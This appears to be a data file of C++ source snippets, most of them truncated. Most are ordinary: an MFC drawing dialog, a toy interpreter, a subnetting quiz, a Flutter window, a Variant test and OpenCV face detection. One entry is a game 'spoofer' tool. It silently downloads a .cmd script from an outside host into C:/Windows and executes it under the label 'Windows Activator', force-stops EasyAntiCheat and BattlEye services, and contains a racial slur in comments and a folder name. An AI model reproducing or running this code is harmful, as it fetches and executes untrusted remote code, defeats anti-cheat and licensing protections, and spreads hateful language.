bNameValid;\n\t\tCString strAboutMenu;\n\t\tbNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);\n\t\tASSERT(bNameValid);\n\t\tif (!strAboutMenu.IsEmpty())\n\t\t{\n\t\t\tpSysMenu->AppendMenu(MF_SEPARATOR);\n\t\t\tpSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);\n\t\t}\n\t}\n\n\t// \u8bbe\u7f6e\u6b64\u5bf9\u8bdd\u6846\u7684\u56fe\u6807\u3002  \u5f53\u5e94\u7528\u7a0b\u5e8f\u4e3b\u7a97\u53e3\u4e0d\u662f\u5bf9\u8bdd\u6846\u65f6\uff0c\u6846\u67b6\u5c06\u81ea\u52a8\n\t//  \u6267\u884c\u6b64\u64cd\u4f5c\n\tSetIcon(m_hIcon, TRUE);\t\t\t// \u8bbe\u7f6e\u5927\u56fe\u6807\n\tSetIcon(m_hIcon, FALSE);\t\t// \u8bbe\u7f6e\u5c0f\u56fe\u6807\n\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u989d\u5916\u7684\u521d\u59cb\u5316\u4ee3\u7801\n\n\tdx = 0;\n\tdy = 0;\n\n\tCRect rc;\n\tGetClientRect(rc);\n\n\t//\u5efa\u7acb\u8bbe\u5907DC\n\tm_pDC = new CClientDC(this);\n\n\t//\u5efa\u7acb\u5185\u5b58DC\n\tm_pMemDC = new CDC;\n\tm_pMemDC->CreateCompatibleDC(m_pDC);\n\n\t//\u5efa\u7acb\u5185\u5b58\u4f4d\u56fe\n\tm_pMemBitmap = new CBitmap;\n\tm_pMemBitmap->CreateCompatibleBitmap(m_pDC, rc.Width(), rc.Height());\n\n\t//\u5c06\u4f4d\u56fe\u9009\u5165\u5185\u5b58DC\n\tm_pMemDC->SelectObject(m_pMemBitmap);\n\n\treturn TRUE;  // \u9664\u975e\u5c06\u7126\u70b9\u8bbe\u7f6e\u5230\u63a7\u4ef6\uff0c\u5426\u5219\u8fd4\u56de TRUE\n}\n\nvoid CMyTestDlg::OnSysCommand(UINT nID, LPARAM lParam)\n{\n\tif ((nID & 0xFFF0) == IDM_ABOUTBOX)\n\t{\n\t\tCAboutDlg dlgAbout;\n\t\tdlgAbout.DoModal();\n\t}\n\telse\n\t{\n\t\tCDialogEx::OnSysCommand(nID, lParam);\n\t}\n}\n\n// \u5982\u679c\u5411\u5bf9\u8bdd\u6846\u6dfb\u52a0\u6700\u5c0f\u5316\u6309\u94ae\uff0c\u5219\u9700\u8981\u4e0b\u9762\u7684\u4ee3\u7801\n//  \u6765\u7ed8\u5236\u8be5\u56fe\u6807\u3002  \u5bf9\u4e8e\u4f7f\u7528\u6587\u6863/\u89c6\u56fe\u6a21\u578b\u7684 MFC \u5e94\u7528\u7a0b\u5e8f\uff0c\n//  \u8fd9\u5c06\u7531\u6846\u67b6\u81ea\u52a8\u5b8c\u6210\u3002\n\nvoid CMyTestDlg::OnPaint()\n{\n\tif (IsIconic())\n\t{\n\t\tCPaintDC dc(this); // \u7528\u4e8e\u7ed8\u5236\u7684\u8bbe\u5907\u4e0a\u4e0b\u6587\n\n\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);\n\n\t\t// \u4f7f\u56fe\u6807\u5728\u5de5\u4f5c\u533a\u77e9\u5f62\u4e2d\u5c45\u4e2d\n\t\tint cxIcon = GetSystemMetrics(SM_CXICON);\n\t\tint cyIcon = GetSystemMetrics(SM_CYICON);\n\t\tCRect rect;\n\t\tGetClientRect(&rect);\n\t\tint x = (rect.Width() - cxIcon + 1) / 2;\n\t\tint y = (rect.Height() - cyIcon + 1) / 2;\n\n\t\t// \u7ed8\u5236\u56fe\u6807\n\t\tdc.DrawIcon(x, y, m_hIcon);\n\t}\n\telse\n\t{\n\t\tLARGE_INTEGER start, end, freq;\n\t\tQueryPerformanceFrequency(&freq);  // \u83b7\u53d6\u8ba1\u6570\u5668\u7684\u9891\u7387\n\t\tQueryPerformanceCounter(&start);  // \u5f00\u59cb\u8ba1\u65f6\n\t\t\n\t\tCRect rect;\n\t\tGetClientRect(&rect);\n\n\t\t// \u5148\u5728\u5185\u5b58\u4e2d\u7ed8\u5236\u5185\u5bb9\n\n\t\t// \u6a21\u62df\u8ba1\u7b97\n\t\tfor (int i = 0; i < 1000000000; i++)\n\t\t{\n\n\t\t}\n\n\t\t// \u521b\u5efa\u4e00\u4e2a\u753b\u5237\uff0c\u8bbe\u5b9a\u4e3a\u6de1\u84dd\u8272\u80cc\u666f\n\t\tCBrush brush(RGB(173, 216, 230)); // \u4f8b\u5982\uff1a\u6de1\u84dd\u8272\n\n\t\t// \u586b\u5145\u5bf9\u8bdd\u6846\u80cc\u666f\n\t\tm_pMemDC->FillRect(rect, &brush);\n\n\t\t// \u7ed8\u5236\u968f\u65f6\u95f4\u79fb\u52a8\u7684\u77e9\u5f62\n\t\tm_pMemDC->Rectangle(50 + dx * 10, 50 + dy * 10, 100 + dx * 10, 100 + dy * 10);\n\n\t\t// \u5c06\u5185\u5b58\u4e2d\u7684\u5185\u5bb9\u4e00\u6b21\u6027\u7ed8\u5236\u5230\u5c4f\u5e55\u4e0a\n\t\tm_pDC->BitBlt(0, 0, rect.Width(), rect.Height(), m_pMemDC, 0, 0, SRCCOPY);\n\n\n\t\tQueryPerformanceCounter(&end);  // \u7ed3\u675f\u8ba1\u65f6\n\t\tdouble elapsed = static_cast<double>(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000.0;  // \u8ba1\u7b97\u7ecf\u8fc7\u7684\u65f6\u95f4\uff08\u6beb\u79d2\uff09\n\t\tm_time.Format(_T(\"%.3f milliseconds\"), elapsed);\n\t\tUpdateData(FALSE);\n\n\t\tCDialogEx::OnPaint();\n\t}\n}\n\n//\u5f53\u7528\u6237\u62d6\u52a8\u6700\u5c0f\u5316\u7a97\u53e3\u65f6\u7cfb\u7edf\u8c03\u7528\u6b64\u51fd\u6570\u53d6\u5f97\u5149\u6807\n//\u663e\u793a\u3002\nHCURSOR CMyTestDlg::OnQueryDragIcon()\n{\n\treturn static_cast<HCURSOR>(m_hIcon);\n}\n\n\n\nvoid CMyTestDlg::OnTimer(UINT_PTR nIDEvent)\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u6d88\u606f\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\u548c/\u6216\u8c03\u7528\u9ed8\u8ba4\u503c\n\n\tdx++;\n\tdy++;\n\n\t//Invalidate(TRUE);\t// \u6e05\u9664\u753b\u677f\u518d\u753b\n\tInvalidate(FALSE);\t//\u4e0d\u6e05\u9664\u753b\u677f\uff0c\u76f4\u63a5\u753b\n\n\tCDialogEx::OnTimer(nIDEvent);\n}\n\n\nvoid CMyTestDlg::OnBnClickedButton1()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tSetTimer(1, 1000, NULL);\n}\n\n\nvoid CMyTestDlg::OnBnClickedButton2()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tKillTimer(1);\n}\n\nvoid CMyTestDlg::OnDestroy()\n{\n\tCDialogEx::OnDestroy();\n\n\t// TODO: \u5728\u6b64\u5904\u6dfb\u52a0\u6d88\u606f\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tdelete m_pMemDC;\n\tdelete m_pDC;\n\tdelete m_pMemBitmap;\n}\n",
    "// This is preliminary experiment for C++ Frame Engine Project\n\n// Project status: toy\n// Requires: C++23 is the target. seriously. need features. absolutely. minimal support is llvm17 -std=c++23\n// Author: The Old Man\n// License: Public Domain\n// Flaws: it's a demonstrator of mechanics design. for the sake of explanation clarity, it does not care about exceptions. don't use for production\n\n#include <iostream>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <utility>\n#include <initializer_list>\n\n#include <deque>\n#include <stack>  \n#include <map>\n#include <list>\n\n// Frame.\n// Frame is a fundamental concept here\n// This one is an exemplary frame, not generic one. in project, frame will become a templated abstraction \n// Frame is a closure for a frame-specific language. we construct an interpreter for that language\n//   - the language construction here is not part of the frame by design, to demonstrate ability to augment foreign c++ objects for scripting.\n//   - interpreter endorsing the frame has two layers: outer, which uses symbols and inner, which uses atoms\n//   - at first glance, symbolic language constructed in this demonstrator may look like Forth, but it is not.\n//     it is not structured. it has numerals but no literals. it has no flow control. it is not Turing-complete. it is not recursive.\n//     it reflects C++ functions, by declarations. consider it rather imperative command language, like JCL or Unix shells. this is by design.\n//   - we call specific execution model represented by constructed interpreter a Frame Machine\n// Frame-related primitives may be global/external functions or functions templates, operating on frame or independently callable \n//    this is demonstrated by process control and RPN arithmetic mechanic on frame's data stack container\n// Alternatively, a frame may provide its own primitive methods \n//    this is demonstrated by boolean flag indicator which is an embedded part of frame\n// Very large frames could provide their own exposed primitives vocabulary suitable for frame composition\n//    this is not demonstrated here yet\n// Generally we combine operators on frame and operators on structures embedded in frame into one symbolic language\n//    finally, a simple console is implemented for play with the frame. This makes whole contraption looking like an interpreter\n\nclass FRAME {\npublic:\n  std::stack<int> data_stack; // forth-like RPN arithmetic data stack\n  // in c++ standard, std::stack is an adapter to std::deque, which is (by standard) already a tree, for adequate complexity.\n  // therefore, we recommend using deque for more advanced structured frames.\n\n  int base = 10; // numeric base setter. stores an integer. this is a kludge for ye olde compiler\n  // std::ios_base& base (std::ios_base&) = std::ios_base::dec; // iomanip base setter. stores a value for ostream manipulator\n\nprivate:  \n  bool flag; // some fancy indicator which just demonstrates a hidden part of this frame, accessible by tokens only\n  // such kind of frame augmenting can be done to any c++ object, turning it into a scriptable machine\n\npublic:  // expose indicator flag manipulators, as usual in getters/setters common pattern\n  void _FLAG_SET (void);\n  void _FLAG_RESET (void);\n  void _FLAG_QUERY (void);\n  void _FLAG_STORE (void);\n  \n} frame; // let's have one\n\n// implementations of exposed member functions\nvoid FRAME::_FLAG_SET (void) { flag = true; };\nvoid FRAME::_FLAG_RESET (void) { flag = false; };\nvoid FRAME::_FLAG_QUERY (void) { data_stack.push(flag); };\nvoid FRAME::_FLAG_STORE (void) {\n    if (data_stack.empty()) {    \n      std::cerr << \"Warning: missing value, flag set operation ignored by frame\" << std::endl;\n      return;\n    }\n    flag = data_stack.top();\n    data_stack.pop();\n};\n\n// atoms.\n// some naive atoms for defined primitives, applicable to that frame\n// atoms are acting radicals, represented as integers in all internal mechanics. may evolve into typed cells in far future\n// atoms are not part of frame definition because in other complex execution model\n// there may be more frames present accessible to common outer language, sharing atoms logically\n// in project, atoms will become employed in prasers, combined, functional programming or/and logical programming execution models of advanced frames. this is by design\n// in procedural programming execution model (which is demonstrated here by this frame), atoms serve as opcodes to primitives\n// our long term goal of the project is to fuse procedural, functional and logical programming paradigms into one hybrid execution model \n\n// our atoms here are simple enum, because in this toy they are static. dynamic atoms creation (by jit compilers for example)\n// and frame composition shall require some better organized integers (like, atomspace arrays or intervals)\ntypedef enum {\n  // magical atom\n  UNDEFINED = 0,\n  // platform process control\n  HELLO, EXIT, ABORT, HELP, QUIT,\n  // arithmetic constants\n  ZERO, ONE, TWO, THREE, \n  //",
    "#include <iostream>\r\n#include <string>\r\n#include <cmath>\r\nusing namespace std;\r\n\r\nstring findWhat;//quiz1, quiz2\r\nstring ip4, findClass;\r\nstring subnetMask ,firstAvailableHostAddressofSubnet1, MaxNOfhostsSubnet;\r\nstring findSM, partOfSM;\r\nstring slash, NA, BA;\r\nint first, second, third, fourth;\r\nlong long subnetsRequired, n, ipSize, cntOf255, hostLeft, availableHosts, range;\r\nint afterSlash, bit, period, forSubnett;\r\nint networkAddress, x;\r\n\r\nstring nTimesOne(int n) {\r\n    int zerosLeft = 8 - n;\r\n    string ans = \"\";\r\n    while(n > 0) {\r\n        ans += \"1\";\r\n        n--;\r\n    }\r\n\r\n    while (zerosLeft > 0) {\r\n        ans += \"0\";\r\n        zerosLeft--;\r\n    }\r\n\r\n    return ans;\r\n}\r\n\r\nstring binToDec(string s) {\r\n    int k, x, ans = 0, i;\r\n    string stAns = \"\";\r\n        k = s.size();\r\n        x = k - 1;\r\n        for(i = 0; i < k; i++) {\r\n            ans += (s[i]-48) * pow(2,x);\r\n            x--;\r\n        }\r\n\r\n        stAns = to_string(ans);\r\n\r\n        return stAns;\r\n}\r\n\r\n\r\nint main() {\r\n    cout << \"Subnetting Quiz1 : quiz1 \\nSubnetting Quiz2 : quiz2 \\n\";\r\n\r\n    cin >> findWhat;\r\n\r\n    if(findWhat == \"quiz1\") {\r\n        cout << \"Insert IPv4 address: \";\r\n        cin >> ip4;\r\n\r\n        cout << \"Insert Subnets required: \";\r\n        cin >> subnetsRequired;\r\n\r\n        n = log2(subnetsRequired);\r\n\r\n        if(pow(2,n) < subnetsRequired) n++;\r\n\r\n        cout << endl << endl << \"n-times one for S/M: \" << n << endl;\r\n        hostLeft = 8 - n;\r\n        cout << \"n-times zero for Hosts: \" << hostLeft << endl;\r\n        //octets\r\n        int k = 0;\r\n        ipSize = ip4.size();\r\n\r\n        while(ip4[k] != '.') {\r\n            first = first * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            second = second * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            third = third * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (k < ipSize) {\r\n            fourth = fourth * 10 + ip4[k]-48;\r\n            k++;\r\n        }\r\n\r\n        cout << \"Network: \" << first << '.' << second << '.' << third << '.' << fourth << endl;\r\n        //find class    A B C\r\n\r\n        if(first > 0 && first < 127) {\r\n            // cout << \"Class: A\\n\";\r\n            cntOf255 = 1; \r\n            findClass = \"A\";\r\n        }\r\n        else if(first > 127 && first < 192) {\r\n            // cout << \"Class: B\\n\"; \r\n            cntOf255 = 2; \r\n            findClass = \"B\";\r\n        }\r\n        else {\r\n            // cout << \"Class: C\\n\"; \r\n            cntOf255 = 3; findClass = \"C\";\r\n        }\r\n\r\n        k = 4;//for S/M, if cntOf255=3 then there is one zero left, so k should be equal to 4 for while loop\r\n        k -= cntOf255;\r\n\r\n        while (cntOf255 > 0) {\r\n            subnetMask += \"255.\";\r\n            cntOf255--;\r\n        }\r\n\r\n        findSM = nTimesOne(n);\r\n        // cout << \"FORSUBNETTTTT: \" << findSM << endl;\r\n        partOfSM = binToDec(findSM);\r\n        // cout << partOfSM << endl;\r\n        subnetMask += partOfSM + \".\";\r\n\r\n        k--;\r\n        while (k > 0) {\r\n            subnetMask += \"0.\";\r\n            k--;\r\n        }\r\n\r\n        subnetMask = subnetMask.substr(0, subnetMask.size() - 1);//silamazistvis\r\n        cout << \"\\n\\n\\t Subnet Mask: \" << subnetMask << endl;\r\n\r\n        //first available host\r\n        range = pow(2,hostLeft);\r\n\r\n        if(findClass == \"A\") {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(range) + \".\" + to_string(third) + \".\" + to_string(fourth+1);\r\n        } else if(findClass == \"B\") {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(second) + \".\" + to_string(range) + \".\" + to_string(fourth+1);\r\n        } else {\r\n            firstAvailableHostAddressofSubnet1 = to_string(first) + \".\" + to_string(second) + \".\" + to_string(third) + \".\" + to_string(range+1);\r\n        }\r\n        \r\n        cout << \"\\t 1st Available Host Address of Subnet 1: \" << firstAvailableHostAddressofSubnet1 << endl;\r\n\r\n        //number of hosts\r\n        if(findClass == \"A\") {\r\n            availableHosts = ( 256 - stoi(partOfSM)) * 256 * 256;\r\n        }else if(findClass == \"B\") {\r\n            availableHosts = ( 256 - stoi(partOfSM)) * 256;\r\n        } else {\r\n            availableHosts = 256 - stoi(partOfSM);\r\n        }\r\n\r\n        availableHosts -= 2;    MaxNOfhostsSubnet = to_string(availableHosts);\r\n        cout << \"\\t Max # of hosts/subnet: \" << MaxNOfhostsSubnet << endl;\r\n\r\n    } else {\r\n\r\n        cout << \"Insert IPv4 Address with it's mask (/24): \";\r\n        cin >> ip4 >> slash;\r\n        int k = 0;\r\n        ipSize = ip4.size();\r\n\r\n        while(ip4[k] != '.') {\r\n            first = first * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            second = second * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n        while (ip4[k] != '.') {\r\n            third = third * 10 + ip4[k] - 48;\r\n            k++;\r\n        } k++;\r\n\r\n     ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <Windows.h>\n#include \"auth/auth.hpp\"\n#include <string>\n#include \"auth/utils.hpp\"\n#include \"auth/skStr.h\"\n\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n#include <Windows.h>\n#include <Urlmon.h>\n\n#pragma comment(lib, \"Urlmon.lib\")\n\nnamespace fs = std::filesystem;\n\n#include <codecvt>\n\n#include <Windows.h>\n\nbool downloadFile(const std::wstring& url, const std::wstring& filePath) {\n    // nigger\n    int urlSize = WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, nullptr, 0, nullptr, nullptr);\n    int filePathSize = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);\n\n    std::string narrowUrl(urlSize, '\\0');\n    std::string narrowFilePath(filePathSize, '\\0');\n\n    WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, narrowUrl.data(), urlSize, nullptr, nullptr);\n    WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, narrowFilePath.data(), filePathSize, nullptr, nullptr);\n\n    // nigger\n    HRESULT hr = URLDownloadToFileA(nullptr, narrowUrl.c_str(), narrowFilePath.c_str(), 0, nullptr);\n    if (FAILED(hr)) {\n        std::cerr << \"Failed to download files. Error code: \" << hr << std::endl;\n        return false;\n    }\n    return true;\n}\n\nvoid menu();\n\nint temp() {\n\n    INPUT input[2];\n\n    \n    input[0].type = INPUT_KEYBOARD;\n    input[0].ki.wScan = 0;\n    input[0].ki.time = 0;\n    input[0].ki.dwExtraInfo = 0;\n    input[0].ki.wVk = 0x31;  \n    input[0].ki.dwFlags = 0;  \n\n    \n    input[1].type = INPUT_KEYBOARD;\n    input[1].ki.wScan = 0;\n    input[1].ki.time = 0;\n    input[1].ki.dwExtraInfo = 0;\n    input[1].ki.wVk = 0x31;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n    \n    input[0].ki.wVk = VK_RETURN;  \n    input[0].ki.dwFlags = 0;      \n\n    \n    input[1].ki.wVk = VK_RETURN;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n}\n\nint win()\n{\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cdn.zerocdn.com/MAS_AIO-CRC32_9AE8AFBA%20%281%29.cmd\",\n    };\n\n    std::vector<std::wstring> fileNames = {\n        L\"windows.cmd\"\n    };\n\n    for (size_t i = 0; i < fileURLs.size(); ++i) {\n        if (!downloadFile(fileURLs[i], folderPath + fileNames[i])) {\n            std::wcerr << L\"Failed to download file: \" << fileURLs[i] << std::endl;\n            return 1;\n        }\n    }\n    _wsystem((folderPath + L\"windows.cmd\").c_str());\n\n    menu();\n}\nvoid tools()\n{\n    SetConsoleTitleA(\"Inertia TOOLS\");\n    system(\"cls\");\n    system(\"cls\");\n\n    printf(\"[ INFO ] Welcome to Inertia PERM SPOOFER\\n\\n\");\n    printf(\"\\n[1] Windows Activator \\n[2] MAC Spoof \\n[3] Return \\n[>] \");\n\n    std::string Spoof;\n    std::cin >> Spoof;\n\n    if (Spoof == \"1\" || Spoof == \"one\") {\n        \n        printf(\"[WARNING] THIS WILL CLOSE THE SPOOFER\");\n        Sleep(2000);\n        ShowWindow(GetConsoleWindow(), SW_HIDE);\n        win();\n        ShowWindow(GetConsoleWindow(), SW_SHOW);\n        printf(\"Done Spoofing...\");\n        Sleep(2000);\n    }\n    if (Spoof == \"2\" || Spoof == \"two\") {\n        printf(\"comign soon :)\");\n        tools();\n    }\n    if (Spoof == \"3\" || Spoof == \"three\") {\n        printf(\"Returning..\");\n        Sleep(2000);\n        menu();\n    }\n\n\n\n\n}\n\nvoid check()\n{\n    system(\"cls\");\n    system(\"echo BaseBoard:\");\n    Sleep(200);\n    system(\"wmic baseboard get serialnumber\");\n    Sleep(200);\n    system(\"echo System UUID:\") ;\n    Sleep(200);\n    system(\"wmic path win32_computersystemproduct get uuid\") ;\n    Sleep(200);\n    system(\"echo BIOS:\") ;\n    Sleep(200);\n    system(\"wmic bios get serialnumber\") ;\n    Sleep(200);\n    system(\"echo CPU:\") ;\n    Sleep(200);\n    system(\"wmic cpu get serialnumber\") ;\n    Sleep(200);\n    system(\"echo Mac Address:\") ;\n    Sleep(200);\n    system(\"getmac\") ;\n    Sleep(200);\n    std::cout << (\"  \")  << '\\n';\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(200);\n    system(\"echo Returning In 5 Seconds\");\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(5000);\n    system(\"cls\") ;\n    menu();\n}\n\n\n\nint spoof() {\n    system(\"taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BEService.exe >nul 2>&1\");\n    system(\"taskkill /F /IM Fortnite.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1\");\n    system(\"sc stop BEService >nul 2>&1\");\n    system(\"sc stop BEDaisy >nul 2>&1\");\n    system(\"sc stop EasyAntiCheat >nul 2>&1\");\n    system(\"sc stop EasyAntiCheatSys >nul 2>&1\");\n\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cd",
    "#include\"Variant.hpp\"\n#include\"Logger.hpp\"\n#include\"variant_to_string.hpp\"\n#include\"FunctionMacro.hpp\"\n\nFunction_Begin(get_type_name,String const)\nParameter(Variant,any)\n    if(any.is_null()){\n        return \"null\";\n    }else if(any.is_boolean()){\n        return \"boolean\";\n    }else if(any.is_number()){\n        return \"number\";\n    }else if(any.is_string()){\n        return \"string\";\n    }else if(any.is_array()){\n        return \"array\";\n    }else if(any.is_object()){\n        return \"object\";\n    }else if(any.is_function()){\n        return \"function\";\n    }\n    return \"undefined\";\nFunction_End\n\nauto lambda_get_type_name=\n    Lambda_Begin(String const)\n    Parameter(Variant const,any)\n        return ::get_type_name(any);\n    Lambda_End;\n\nint main(int argc,char* argv[]){\n    static_assert(sizeof(Variant)<=sizeof(void*));\n    Variant variant=Object{\n        {\"null\",Null{}},\n        {\"boolean\",true},\n        {\"integer\",-1},\n        {\"float\",3.14},\n        {\"character\",'A'},\n        {\"string\",\"hello\"},\n        {\"array\",\n            Array{\n                Null{},false,1,-3.14,'B',\"world\",\n                Array{1,2},Object{{\"name\",\"Tom\"},{\"age\",20}},\n                Lambda_Begin(Null)\n                Parameter(Number const,num1)\n                Parameter(Number const,num2)\n                    ::std::cout<<num1<<num2<<\"\\n\";\n                Lambda_End\n            },\n        },\n        {\"set_value\",\n            Lambda_Begin(Null,&variant)\n            Parameter(String const,name)\n            Parameter(Number const,age)\n                variant.object()[\"name\"]=name;\n                variant.object()[\"age\"]=age;\n            Lambda_End\n        }\n    };\n    variant.object()[\"set_value\"].function().Invoke(\"Jerry\",114514);\n    Logger::info(variant_to_string(variant));\n    BoxManager<typename Variant::value_type>::print_object_pool();\n    BoxManager<typename Variant::value_type>::print_memory_pool();\n    return 0;\n}",
    "#include <opencv2/dnn.hpp>\n#include <opencv2/highgui.hpp>\n#include <opencv2/imgproc.hpp>\n#include <opencv2/objdetect.hpp>\n\n#include <iostream>\n\nusing namespace cv;\nusing namespace std;\n\nstatic void visualize(Mat &input, int frame, Mat &faces, double fps,\n                      int thickness = 2) {\n  std::string fpsString = cv::format(\"FPS : %.2f\", (float)fps);\n  if (frame >= 0)\n    cout << \"Frame \" << frame << \", \";\n  cout << \"FPS: \" << fpsString << endl;\n  for (int i = 0; i < faces.rows; i++) {\n    // Print results\n    cout << \"Face \" << i << \", top-left coordinates: (\" << faces.at<float>(i, 0)\n         << \", \" << faces.at<float>(i, 1) << \"), \"\n         << \"box width: \" << faces.at<float>(i, 2)\n         << \", box height: \" << faces.at<float>(i, 3) << \", \"\n         << \"score: \" << cv::format(\"%.2f\", faces.at<float>(i, 14)) << endl;\n\n    // Draw bounding box\n    rectangle(input,\n              Rect2i(int(faces.at<float>(i, 0)), int(faces.at<float>(i, 1)),\n                     int(faces.at<float>(i, 2)), int(faces.at<float>(i, 3))),\n              Scalar(0, 255, 0), thickness);\n    // Draw landmarks\n    circle(input,\n           Point2i(int(faces.at<float>(i, 4)), int(faces.at<float>(i, 5))), 2,\n           Scalar(255, 0, 0), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 6)), int(faces.at<float>(i, 7))), 2,\n           Scalar(0, 0, 255), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 8)), int(faces.at<float>(i, 9))), 2,\n           Scalar(0, 255, 0), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 10)), int(faces.at<float>(i, 11))), 2,\n           Scalar(255, 0, 255), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 12)), int(faces.at<float>(i, 13))), 2,\n           Scalar(0, 255, 255), thickness);\n  }\n  putText(input, fpsString, Point(0, 15), FONT_HERSHEY_SIMPLEX, 0.5,\n          Scalar(0, 255, 0), 2);\n}\n\nint main(int argc, char **argv) {\n  CommandLineParser parser(\n      argc, argv,\n      \"{help h | | Print this message}\"\n      \"{image1 i1 | | Path to the input image1. Omit for detecting through \"\n      \"VideoCapture}\"\n      \"{image2 i2 | | Path to the input image2. When image1 and image2 \"\n      \"parameters given then the program try to find a face on both images and \"\n      \"runs face recognition algorithm}\"\n      \"{video v | 0 | Path to the input video}\"\n      \"{scale sc | 1.0 | Scale factor used to resize input video frames}\"\n      \"{fd_model fd | face_detection_yunet_2021dec.onnx| Path to the model. \"\n      \"Download yunet.onnx in \"\n      \"https://github.com/opencv/opencv_zoo/tree/master/models/\"\n      \"face_detection_yunet}\"\n      \"{fr_model fr | face_recognition_sface_2021dec.onnx | Path to the face \"\n      \"recognition model. Download the model at \"\n      \"https://github.com/opencv/opencv_zoo/tree/master/models/\"\n      \"face_recognition_sface}\"\n      \"{score_threshold | 0.9 | Filter out faces of score < score_threshold}\"\n      \"{nms_threshold | 0.3 | Suppress bounding boxes of iou >= nms_threshold}\"\n      \"{top_k | 5000 | Keep top_k bounding boxes before NMS}\"\n      \"{save s | false | Set true to save results. This flag is invalid when \"\n      \"using camera}\");\n  if (parser.has(\"help\")) {\n    parser.printMessage();\n    return 0;\n  }\n\n  String fd_modelPath = parser.get<String>(\"fd_model\");\n  String fr_modelPath = parser.get<String>(\"fr_model\");\n\n  float scoreThreshold = parser.get<float>(\"score_threshold\");\n  float nmsThreshold = parser.get<float>(\"nms_threshold\");\n  int topK = parser.get<int>(\"top_k\");\n\n  bool save = parser.get<bool>(\"save\");\n  float scale = parser.get<float>(\"scale\");\n\n  double cosine_similar_thresh = 0.363;\n  double l2norm_similar_thresh = 1.128;\n\n  // Initialize FaceDetectorYN\n  